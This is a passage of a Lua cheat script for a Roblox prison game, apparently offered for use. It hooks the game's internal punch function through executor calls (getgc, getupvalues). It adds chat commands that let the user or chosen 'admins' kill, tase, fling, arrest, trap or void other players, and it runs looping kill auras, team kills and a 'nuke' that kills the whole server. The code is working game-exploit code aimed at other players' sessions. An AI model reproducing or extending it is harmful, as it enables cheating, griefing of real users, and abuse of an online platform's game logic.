            for i = 1, 10 do
                LoadPos();
            end;
        else
            WarnDisabled("arrest");
        end;
    end;
    if CMD2("crim") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Crim(Player, false);
                    end);
                else
                    WarnProtected(Admin, Player, "crim");
                end;
            else
                NotAValidPlayer("crim");
            end;
        else
            WarnDisabled("crim");
        end;
    end;
    if CMD2("fling") then
        if AdminSettings.othercmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "othercmds") or Player == Admin then
                    AddToQueue(function()
                        Fling(Player, false);
                    end);
                else
                    WarnProtected(Admin, Player, "fling");
                end;
            else
                NotAValidPlayer("fling");
            end;
        else
            WarnDisabled("fling");
        end;
    end;
    if CMD2("sfling") then
        if AdminSettings.othercmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "othercmds") or Player == Admin then
                    AddToQueue(function()
                        Fling(Player, true);
                    end);
                else
                    WarnProtected(Admin, Player, "sfling");
                end;
            else
                NotAValidPlayer("sfling");
            end;
        else
            WarnDisabled("sfling");
        end;
    end;
    if CMD2("keycard") or CMD2("key") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Keycard(Player);
                    end);
                else
                    WarnProtected(Admin, Player, "keycard");
                end;
            else
                NotAValidPlayer("keycard");
            end;
        else
            WarnDisabled("keycard");
        end;
    end;
    if CMD2("handcuffs") or CMD2("cuffs") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "Handcuffs", false, "Bright blue", true);
                    end);
                else
                    WarnProtected(Admin, Player, "handcuffs");
                end;
            else
                NotAValidPlayer("handcuffs");
            end;
        else
            WarnDisabled("handcuffs");
        end;
    end;
    if CMD2("taser") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "Taser", false, "Bright blue", true);
                    end);
                else
                    WarnProtected(Admin, Player, "taser");
                end;
            else
                NotAValidPlayer("taser");
            end;
        else
            WarnDisabled("taser");
        end;
    end;
    if CMD2("shield") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    if CheckOwnedGamepass() then
                        AddToQueue(function()
                            Give(Player, "Riot Shield", true, "Bright blue");
                        end);
                    else
                        Chat("/w " .. Admin.Name .. " I cannot use this command because I don't have the riot gamepass.");
                    end;
                else
                    WarnProtected(Admin, Player, "shield");
                end;
            else
                NotAValidPlayer("shield");
            end;
        else
            WarnDisabled("shield");
        end;
    end;
    if CMD2("shotty") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "Remington 870", true);
                    end);
                else
                    WarnProtected(Admin, Player, "shotty");
                end;
            else
                NotAValidPlayer("shotty");
            end;
        else
            WarnDisabled("shotty");
        end;
    end;
    if CMD2("m9") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "M9", true);
                    end);
                else
                    WarnProtected(Admin, Player, "m9");
                end;
            else
                NotAValidPlayer("m9");
            end;
        else
            WarnDisabled("m9");
        end;
    end;
    if CMD2("ak") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "AK-47", true);
                    end);
                else
                    WarnProtected(Admin, Player, "ak");
                end;
            else
                NotAValidPlayer("ak");
            end;
        else
            WarnDisabled("ak");
        end;
    end;
    if CMD2("m4") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    if CheckOwnedGamepass() then
                        AddToQueue(function()
                            Give(Player, "M4A1", true);
                        end);
                    else
                        Chat("/w " .. Admin.Name .. " I cannot use this command because I don't have the riot gamepass.");
                    end;
                else
                    WarnProtected(Admin, Player, "m4");
                end;
            else
                NotAValidPlayer("m4");
            end;
        else
            WarnDisabled("m4");
        end;
    end;
    if CMD2("hammer") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "Hammer", false);
                    end);
                else
                    WarnProtected(Admin, Player, "hammer");
                end;
            else
                NotAValidPlayer("hammer");
            end;
        else
            WarnDisabled("hammer");
        end;
    end;
    if CMD2("knife") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "Crude Knife", false);
                    end);
                else
                    WarnProtected(Admin, Player, "knife");
                end;
            else
                NotAValidPlayer("knife");
            end;
        else
            WarnDisabled("knife");
        end;
    end;
    if CMD2("nexus") or CMD2("nex") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Teleport(Player, CFrame.new(888, 100, 2388));
                    end);
                else
                    WarnProtected(Admin, Player, "nexus");
                end;
            else
                NotAValidPlayer("nexus");
            end;
        else
            WarnDisabled("nexus")
        end;
    end;
    if CMD2("tower") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Teleport(Player, CFrame.new(823, 130, 2588));
                    end);
                else
                    WarnProtected(Admin, Player, "tower");
                end;
            else
                NotAValidPlayer("tower");
            end;
        else
            WarnDisabled("tower");
        end;
    end;
    if CMD2("back") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Teleport(Player, CFrame.new(984, 100, 2318));
                    end);
                else
                    WarnProtected(Admin, Player, "back");
                end;
            else
                NotAValidPlayer("back");
            end;
        else
            WarnDisabled("back");
        end;
    end;
    if CMD2("base") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Teleport(Player, CFrame.new(-943, 94, 2056));
                    end);
                else
                    WarnProtected(Admin, Player, "base");
                end;
            else
                NotAValidPlayer("base");
            end;
        else
            WarnDisabled("base");
        end;
    end;
    if CMD2("armory") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Teleport(Player, CFrame.new(837, 100, 2266));
                    end);
                else
                    WarnProtected(Admin, Player, "armory");
                end;
            else
                NotAValidPlayer("armory");
            end;
        else
            WarnDisabled("armory");
        end;
    end;
    if CMD2("yard") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Teleport(Player, CFrame.new(791, 98, 2498));
                    end);
                else
                    WarnProtected(Admin, Player, "yard");
                end;
            else
                NotAValidPlayer("yard");
            end;
        else
            WarnDisabled("yard");
        end;
    end;
    if CMD2("cells") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Teleport(Player, CFrame.new(917, 100, 2444));
                    end);
                else
                    WarnProtected(Admin, Player, "cells");
                end;
            else
                NotAValidPlayer("cells");
            end;
        else
            WarnDisabled("cells")
        end;
    end;
    if CMD2("cafe") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Teleport(Player, CFrame.new(930, 100, 2289));
                    end);
                else
                    WarnProtected(Admin, Player, "cafe");
                end;
            else
                NotAValidPlayer("cafe");
            end;
        else
            WarnDisabled("cafe");
        end;
    end;
    if CMD2("ka") then
        if AdminSettings.killcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "killcmds") or Player == Admin then
                    AddToQueue(function()
                        KillAuras[Player.UserId] = Player;
                    end);
                else
                    WarnProtected(Admin, Player, "ka");
                end;
            else
                NotAValidPlayer("ka");
            end;
        else
            WarnDisabled("ka");
        end;
    end;
    if CMD2("unka") then
        local Player = GetPlayer(Args[2], Admin);
        if Player then
            AddToQueue(function()
                KillAuras[Player.UserId] = nil;
            end);
        else
            NotAValidPlayer("unka");
        end;
    end;
    if CMD2("virus") then
        if AdminSettings.killcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "killcmds") or Player == Admin then
                    AddToQueue(function()
                        Infected[Player.UserId] = Player;
                    end);
                else
                    WarnProtected(Admin, Player, "virus");
                end;
            else
                NotAValidPlayer("virus");
            end;
        else
            WarnDisabled("virus");
        end;
    end;
    if CMD2("unvirus") then
        local Player = GetPlayer(Args[2], Admin);
        if Player then
            AddToQueue(function()
                Infected[Player.UserId] = nil;
            end);
        else
            NotAValidPlayer("virus");
        end;
    end;
    if CMD2("trap") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Trapped[Player.UserId] = Player;
                    end);
                else
                    WarnProtected(Admin, Player, "trap");
                end;
            else
                NotAValidPlayer("trap");
            end;
        else
            WarnDisabled("trap");
        end;
    end;
    if CMD2("untrap") then
        local Player = GetPlayer(Args[2], Admin);
        if Player then
            if CheckProtected(Player, "tpcmds") or Player == Admin then
                AddToQueue(function()
                    Trapped[Player.UserId] = nil;
                end);
            else
                WarnProtected(Admin, Player, "untrap");
            end;
        else
            NotAValidPlayer("untrap");
        end;
    end;
    if CMD2("void") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Teleport(Player, CFrame.new(0, 9e9, 0));
                    end);
                else
                    WarnProtected(Admin, Player, "void");
                end;
            else
                NotAValidPlayer("void");
            end;
        else
            WarnDisabled("void");
        end;
    end;
    if CMD2("ctp") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        if not States.AntiCrash then
                            if not ClickTeleports[Player.UserId] then
                                ClickTeleports[Player.UserId] = Player;
                                Chat("/w " .. Player.Name .. " Enabled click teleport for " .. Player.Name .. " - shoot anywhere with a gun to teleport (type " .. PF .. "ctp " .. Player.Name .. " to disable).")
                            else
                                ClickTeleports[Player.UserId] = nil;
                                Chat("/w " .. Player.Name .. " Disabled click teleport for " .. Player.Name .. ".");
                            end;
                        else
                            Chat("/w " .. Player.Name .. " I cannot do that right now.");
                        end;
                    end);
                else
                    WarnProtected(Admin, Player, "ctp");
                end;
            else
                NotAValidPlayer("ctp");
            end;
        else
            WarnDisabled("ctp");
        end;
    end;
    if CMD2("oneshot") then
        if AdminSettings.killcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "killcmds") or Player == Admin then
                    AddToQueue(function()
                        if not States.AntiCrash then
                            if not Oneshots[Player.UserId] then
                                Oneshots[Player.UserId] = Player;
                                Chat("/w " .. Player.Name .. " Enabled one shot for " .. Player.Name .. " (type " .. PF .. "oneshot " .. Player.Name .. " to disable).")
                            else
                                Oneshots[Player.UserId] = nil;
                                Chat("/w " .. Player.Name .. " Disabled one shot for " .. Player.Name .. ".");
                            end;
                        else
                            Chat("/w " .. Player.Name .. " I cannot do that right now.");
                        end;
                    end);
                else
                    WarnProtected(Admin, Player, "oneshot");
                end;
            else
                NotAValidPlayer("oneshot");
            end;
        else
            WarnDisabled("oneshot");
        end;
    end;
    if CMD2("onepunch") then
        if AdminSettings.killcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "killcmds") or Player == Admin then
                    AddToQueue(function()
                        if not States.AntiCrash then
                            if not Onepunch[Player.UserId] then
                                Onepunch[Player.UserId] = Player;
                                Chat("/w " .. Player.Name .. " Enabled one punch for " .. Player.Name .. " (type " .. PF .. "onepunch " .. Player.Name .. " to disable).")
                            else
                                Onepunch[Player.UserId] = nil;
                                Chat("/w " .. Player.Name .. " Disabled one punch for " .. Player.Name .. ".");
                            end;
                        else
                            Chat("/w " .. Player.Name .. " I cannot do that right now.");
                        end;
                    end);
                else
                    WarnProtected(Admin, Player, "onepunch");
                end;
            else
                NotAValidPlayer("onepunch");
            end;
        else
            WarnDisabled("onepunch");
        end;
    end;
    if CMD2("bring") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                            TeleportPlayers(Player, Admin);
                        end);
                    end);
                else
                    WarnProtected(Admin, Player, "bring");
                end;
            else
                NotAValidPlayer("bring");
            end;
        else
            WarnDisabled("void");
        end;
    end;
    if CMD2("to") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                            TeleportPlayers(Admin, Player);
                        end);
                    end);
                else
                    WarnProtected(Admin, Player, "goto");
                end;
            else
                NotAValidPlayer("goto");
            end;
        else
            WarnDisabled("goto");
        end;
    end;
end;

--// Player removed / added:
local function PlayerRemoving(PLR)
    if CurrentlyViewing then
        if CurrentlyViewing.Player == PLR then
            CurrentlyViewing = nil;
            pcall(function()
                Camera.CameraSubject = LocalPlayer.Character.Humanoid
            end);
        end;
    end;
    if ArmorSpamFlags[PLR.Name] then
        ArmorSpamFlags[PLR.Name] = nil;
    end;
end;

local function PlayerAdded(PLR)
    if Loopkilling[PLR.UserId] then
        Loopkilling[PLR.UserId] = PLR;
    end;
    if LoopTasing[PLR.UserId] then
        LoopTasing[PLR.UserId] = PLR;
    end;
    if MeleeKilling[PLR.UserId] then
        MeleeKilling[PLR.UserId] = PLR;
    end;
    if Admins[PLR.UserId] then
        Admins[PLR.UserId] = PLR;
    end;
    if Protected[PLR.UserId] then
        Protected[PLR.UserId] = PLR;
    end;
    if SpeedKilling[PLR.UserId] then
        SpeedKilling[PLR.UserId] = PLR;
    end;
    if Loopkilling[PLR.UserId] then
        LoopTo[PLR.UserId] = PLR;
    end;
    PLR.Chatted:Connect(function(Message)
        if Admins[PLR.UserId] then
            UseRankedCommands(Message, PLR);
        end;
    end);
end;

for i,v in pairs(Players:GetPlayers()) do
    if v ~= LocalPlayer then
        v.Chatted:Connect(function(Message)
            if Admins[v.UserId] then
                UseRankedCommands(Message, v);
            end;
        end);
    end;
end;

--// Connections:
LocalPlayer.Chatted:Connect(UseCommand);

LocalPlayer.CharacterAdded:Connect(AutoRespawnCharacterAdded);

LocalPlayer.CharacterAdded:Connect(function(CHAR)
    local Humanoid = CHAR:WaitForChild("Humanoid", 1);
    if Humanoid then
        LocalViewerAdded();
        Humanoid.Died:Connect(function()
            pcall(function()
                Camera.CameraSubject = CurrentlyViewing.Player.Character;
            end);
        end);
    end;
end);

LocalPlayer.CharacterAdded:Connect(function(CHAR)
    if States.AutoGuns then
        GiveGuns();
    end;
    pcall(function()
        WhitelistItem(LocalPlayer.Backpack:FindFirstChild("M9"));
        WhitelistItem(LocalPlayer.Backpack:FindFirstChild("Handcuffs"));
        WhitelistItem(LocalPlayer.Backpack:FindFirstChild("Taser"));
    end);
end);

LocalPlayer.CharacterAdded:Connect(function(CHAR)
    if not Info.StopRespawnLag then
        local ClientInputHandler = CHAR:WaitForChild("ClientInputHandler", 1);
        if ClientInputHandler then
            --[[YieldUntilScriptLoaded(ClientInputHandler);
            --local PF;]]
            PunchFunction = nil;
            Info.PunchFunction = nil;
            task.wait(1);
            for i,v in pairs(getgc()) do
                if type(v) == "function" and getfenv(v).script == ClientInputHandler then
                    --local isPunchFunction = false;
                    for i2,v2 in pairs(getupvalues(v)) do
                        if tostring(v2) == "fight_left" then
                            PunchFunction = v
                            break
                        end;
                    end;
                    if PunchFunction then
                        break
                    end;
                end;
            end;
            if PunchFunction then
                --PunchFunction = v;
                
                --// hookin it
                local Old = PunchFunction;
                PunchFunction = function(...)
                    if States.OnePunch then
                        local Character;
                        if States.PunchAura then
                            Character = ClosestCharacter(20);
                        else
                            Character = ClosestCharacter(5);
                        end;
                        if Character then
                            for i = 1, 15 do
                                MeleeEvent(Players:GetPlayerFromCharacter(Character));
                            end;
                        end;
                    end;
                    return Old(...)
                end;
                Info.PunchFunction = PunchFunction;
            end;
        end;
    end;
end);

Players.PlayerAdded:Connect(PlayerAdded);
Players.PlayerRemoving:Connect(PlayerRemoving);

--// Trapped Players:
task.spawn(function()
    while task.wait(0.03) do
        if next(Trapped) then
            for i,v in next, Trapped do
                pcall(function()
                    if (v.Character.HumanoidRootPart.Position-Vector3.new(-297, 54, 2004)).Magnitude > 80 and v.Character.Torso.Anchored ~= true and v.Character.Humanoid.Health > 0 then
                        Teleport(v, CFrame.new(-297, 54, 2004));
                        task.wait(2);
                    end;
                end);
            end;
        end;
    end;
end);

--// Loopkills:
task.spawn(function()
    while task.wait(1/5) do
        if next(Loopkilling) then
            local LKPlayers = {};
            for i,v in next, Loopkilling do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local ForceField = v.Character:FindFirstChild("ForceField");
                    if Humanoid and Humanoid.Health > 0 and not ForceField then
                        LKPlayers[#LKPlayers+1] = v;
                    end;
                end;
            end;
            if next(LKPlayers) then
                Kill(LKPlayers);
            end;
        end;
    end;
end);

--// Speed Kills:
task.spawn(function()
    while true do
        if next(SpeedKilling) then
            local SpeedKillPlayers = {}
            for i,v in next, SpeedKilling do
                if v.Character and CheckProtected(v, "killcmds") then
                    SpeedKillPlayers[#SpeedKillPlayers+1] = v;
                    end;
                end;
            if next(SpeedKillPlayers) then
                --task.spawn(SpeedKill, SpeedKillPlayers);
                SpeedKill(SpeedKillPlayers)
            end;
        end;
        task.wait(0.03)
    end;
end);

--// Melee Kills:
task.spawn(function()
    while task.wait(0.03) do
        if next(MeleeKilling) then
            local DoSavePos = false;
            SavePos();
            for i,v in next, MeleeKilling do
                if v.Character and CheckProtected(v, "killcmds") then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local ForceField = v.Character:FindFirstChild("ForceField");
                    if Humanoid and Humanoid.Health > 0 and not ForceField then
                        MeleeKill(v);
                        DoSavePos = true;
                    end;
                end;
            end;
            if DoSavePos then
                LoadPos();
            end;
        end;
    end;
end);

--// Melee Kill All:
task.spawn(function()
    while task.wait(0.03) do
        if States.MeleeAll then
            if next(Players:GetPlayers()) then
                local DoSavePos = false;
                SavePos();
                for i,v in pairs(Players:GetPlayers()) do   
                    if v ~= LocalPlayer then
                        if v.Character and not MeleeKilling[v.UserId] and CheckProtected(v, "killcmds") then
                            local Humanoid = v.Character:FindFirstChild("Humanoid");
                            local ForceField = v.Character:FindFirstChild("ForceField");
                            if Humanoid and Humanoid.Health > 0 and not ForceField then
                                MeleeKill(v);
                                DoSavePos = true;
                            end;
                        end;
                    end;
                end;
                if DoSavePos then
                    LoadPos();
                end;
            end;
        end;
    end;
end);

--// Nukes:
task.spawn(function()
    while task.wait(0.03) do
        if next(Nukes) then
            for i,v in next, Nukes do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChildWhichIsA("Humanoid");
                    if Humanoid then
                        if Humanoid.Health <= 0 then
                            Chat("!!! THE NUKE (" .. v.DisplayName .. ") HAS BEEN ACTIVATED - EVERYONE WILL DIE IN 5 SECONDS !!!");
                            task.wait(1);
                            Chat("4...");
                            task.wait(1);
                            Chat("3...");
                            task.wait(1);
                            Chat("2...");
                            task.wait(1);
                            Chat("1...");
                            task.wait(1);
                            local PTable = Players:GetPlayers();
                            for _,x in next, Nukes do
                                for i,y in next, PTable do
                                    if y == x then
                                        table.remove(PTable, i);
                                    end;
                                    if not CheckProtected(y, "killcmds") then
                                        table.remove(PTable, i);
                                    end;
                                end;
                            end;
                            Kill(PTable);
                        end;
                    end;
                end;
            end;
        end;
    end;
end)

--// Loop tase:
task.spawn(function()
    while task.wait(1/5) do
        if next(LoopTasing) then
            local TPlayers = {};
            for i,v in next, LoopTasing do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local Team = v.TeamColor.Name
                    if Humanoid and Humanoid.Health > 0 and Team ~= "Bright blue" then
                        TPlayers[#TPlayers+1] = v;
                    end;
                end;
            end;
            if next(TPlayers) then
                Tase(TPlayers);
            end;
        end;
    end;
end)

--// Virus
task.spawn(function()
    while task.wait(1/3) do
        if next(Infected) then
            local VirusPlayers = {};
            for i,v in next, Infected do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local ForceField = v.Character:FindFirstChild("ForceField");
                    local PrimaryPart = v.Character:FindFirstChildWhichIsA("BasePart");
                    if PrimaryPart and Humanoid and Humanoid.Health > 0 and not ForceField then
                        for _,plr in pairs(Players:GetPlayers()) do
                            if CheckProtected(plr, "killcmds") then
                                if plr.Character and plr ~= LocalPlayer and plr ~= v then
                                    local VPart = plr.Character:FindFirstChildWhichIsA("BasePart");
                                    local PHum = plr.Character:FindFirstChild("Humanoid");
                                    local FF = plr.Character:FindFirstChild("ForceField")
                                    if VPart and PHum and not FF then
                                        if PHum.Health > 0 and (PrimaryPart.Position-VPart.Position).Magnitude <= 6 then
                                            VirusPlayers[#VirusPlayers+1] = plr;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
            end;
            if next(VirusPlayers) then
                Kill(VirusPlayers);
            end;
        end;
    end;
end)

--// Kill Aura
task.spawn(function()
    while task.wait(1/3) do
        if next(KillAuras) then
            local InAura = {};
            for i,v in next, KillAuras do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local ForceField = v.Character:FindFirstChild("ForceField");
                    local PrimaryPart = v.Character:FindFirstChildWhichIsA("BasePart");
                    if PrimaryPart and Humanoid and Humanoid.Health > 0 and not ForceField then
                        for _,plr in pairs(Players:GetPlayers()) do
                            if CheckProtected(plr, "killcmds") then
                                if plr.Character and plr ~= LocalPlayer and plr ~= v then
                                    local VPart = plr.Character:FindFirstChildWhichIsA("BasePart");
                                    local PHum = plr.Character:FindFirstChild("Humanoid");
                                    local FF = plr.Character:FindFirstChild("ForceField")
                                    if VPart and PHum and not FF then
                                        if PHum.Health > 0 and (PrimaryPart.Position-VPart.Position).Magnitude <= 20 then
                                            InAura[#InAura+1] = plr;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
            end;
            if next(InAura) then
                Kill(InAura);
            end;
        end;
    end;
end)

--// Tase Aura
task.spawn(function()
    while task.wait(1/3) do
        if next(TaseAuras) then
            local InAura = {};
            for i,v in next, TaseAuras do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local ForceField = v.Character:FindFirstChild("ForceField");
                    local PrimaryPart = v.Character:FindFirstChildWhichIsA("BasePart");
                    if PrimaryPart and Humanoid and Humanoid.Health > 0 and not ForceField then
                        for _,plr in pairs(Players:GetPlayers()) do
                            if CheckProtected(plr, "killcmds") then
                                if plr.Character and plr ~= LocalPlayer and plr ~= v then
                                    local VPart = plr.Character:FindFirstChild("HumanoidRootPart");
                                    local VTorso = plr.Character:FindFirstChild("Torso")
                                    local PHum = plr.Character:FindFirstChild("Humanoid");
                                    local FF = plr.Character:FindFirstChild("ForceField")
                                    if VPart and PHum and VTorso and not FF then
                                        if PHum.Health > 0 and (PrimaryPart.Position-VPart.Position).Magnitude <= 20 then
                                            if (VPart.Position-VTorso.Position).Magnitude <= 1 then
                                                InAura[#InAura+1] = plr;
                                            end;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
            end;
            if next(InAura) then
                Tase(InAura);
            end;
        end;
    end;
end)

--// Arrest Aura:
task.spawn(function()
    while task.wait(0.03) do
        if States.ArrestAura then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "arrestcmds") then
                    if LocalPlayer.Character and v.Character then
                        local LHead, VHead = LocalPlayer.Character:FindFirstChildWhichIsA("BasePart"), v.Character:FindFirstChildWhichIsA("BasePart")
                        if LHead and VHead then
                            if (LHead.Position-VHead.Position).Magnitude <= 50 then
                                ArrestEvent(v);
                            end;
                        end;
                    end;
                end;
            end;
        end;
    end;
end)

--// Melee Aura:
task.spawn(function()
    while task.wait(0.03) do
        if States.MeleeAura then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    if LocalPlayer.Character and v.Character then
                        local LHead, VHead = LocalPlayer.Character:FindFirstChildWhichIsA("BasePart"), v.Character:FindFirstChildWhichIsA("BasePart")
                        if LHead and VHead then
                            if (LHead.Position-VHead.Position).Magnitude <= 50 then
                                for i = 1, 5 do
                                    MeleeEvent(v);
                                end;
                            end;
                        end;
                    end;
                end;
            end;
        end;
    end;
end)

local function OnePunchF(Player)
    local function CharacterAdded(Char)
        if Char then
            local Humanoid = Char:WaitForChild("Humanoid", 1);
            local RootPart = Char:WaitForChild("HumanoidRootPart", 1);
            local PrimaryPart = Char:WaitForChild("Head", 1)
            if Humanoid and RootPart and PrimaryPart then
                Humanoid.AnimationPlayed:Connect(function(Track)
                    if Onepunch[Player.UserId] then
                        if Track.Animation.AnimationId == "rbxassetid://484200742" or Track.Animation.AnimationId == "rbxassetid://484926359" then
                            for i,v in pairs(Players:GetPlayers()) do
                                if v ~= Player and v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                                    if v.Character then
                                        pcall(function()
                                            local VPart = v.Character.PrimaryPart;
                                            local PPart = PrimaryPart;
                                            local Angle = math.deg(math.acos(Char.HumanoidRootPart.CFrame.LookVector.unit:Dot((VPart.Position-PPart.Position).unit)))
                                            if Angle < 50 and (PPart.Position-VPart.Position).Magnitude <= 10 then
                                                Kill({v});
                                            end;
                                        end);
                                    end;
                                end;
                            end;
                        end;
                    end;
                end);
            end;
        end;
    end;

    CharacterAdded(Player.Character);

    Player.CharacterAdded:Connect(CharacterAdded);
end;  

for i,v in pairs(Players:GetPlayers()) do
    if v ~= LocalPlayer then
        OnePunchF(v);
    end;
end;

Players.PlayerAdded:Connect(OnePunchF);

--// NoClip:
rService.Stepped:Connect(function()
    if States.NoClip then
        if LocalPlayer.Character then
            for i,v in pairs(LocalPlayer.Character:GetChildren()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false;
                end;
            end;
        end;
    end;
end);

--// Team kill:
task.spawn(function()
    while task.wait(0.75) do
        if States.KillAll then
            KillPlayers(Players);
        end;
        if States.KillInmates then
            KillPlayers(Teams.Inmates);
        end;
        if States.KillGuards then
            KillPlayers(Teams.Guards);
        end;
        if States.KillCriminals then
            KillPlayers(Teams.Criminals);
        end;
        if States.TaseAll then
            Tase(Players:GetPlayers());
        end;
    end;
end)

--// Team SpeedKill:
task.spawn(function()
    while task.wait(0.03) do
        local SpeedKillPlayers = {};
        if States.SpeedKillAll then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    SpeedKillPlayers[#SpeedKillPlayers+1] = v;
                end;
            end;
        end;
        if States.SpeedKillInmates then
            for i,v in pairs(Teams.Inmates:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    SpeedKillPlayers[#SpeedKillPlayers+1] = v;
                end;
            end;
        end;    
        if States.SpeedKillGuards then
            for i,v in pairs(Teams.Guards:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    SpeedKillPlayers[#SpeedKillPlayers+1] = v;
                end;
            end;
        end;
        if States.SpeedKillCriminals then
            for i,v in pairs(Teams.Criminals:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    SpeedKillPlayers[#SpeedKillPlayers+1] = v;
                end;
            end;
        end;
        if next(SpeedKillPlayers) then
            SpeedKill(SpeedKillPlayers);
        end;
    end;
end);

--// Reset Armor Spam Flags:
local function ResetArmorSpamFlags(PLR)
    ArmorSpamFlags[PLR.Name] = 0;
end;

for i,v in pairs(Players:GetPlayers()) do
    if v ~= LocalPlayer then
        ResetArmorSpamFlags(v);
        v.CharacterAdded:Connect(ResetArmorSpamFlags);
    end;
end;

Players.PlayerAdded:Connect(function(PLR)
    PLR.CharacterAdded:Connect(ResetArmorSpamFlags);
end);

--// Anti Punch

local function AntiPunchPlayerAdded(PLR)
    PLR.CharacterAdded:Connect(function(Char)
        if Char then
            local Humanoid = Char:WaitForChild("Humanoid", 1);
            if Humanoid then
                Humanoid.AnimationPlayed:Connect(function(AnimationTrack)
                    if States.AntiPunch and CheckProtected(PLR, "killcmds") then
